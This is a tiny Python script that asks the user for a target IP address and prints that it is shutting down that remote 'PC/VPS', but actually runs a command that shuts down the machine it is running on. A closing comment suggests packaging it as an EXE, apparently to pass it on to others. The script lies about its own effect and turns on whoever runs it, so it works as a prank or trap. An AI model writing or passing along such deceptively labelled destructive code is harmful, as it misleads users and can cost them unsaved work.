import os
import time
target = input("Enter IP : ")
print(f"Shutdowning {target}  PC/VPS")
time.sleep(0.5)
os.system("shutdown /s /t 1")
#Done And COPY SCRIPT PASTE TO EXE SCRIPT
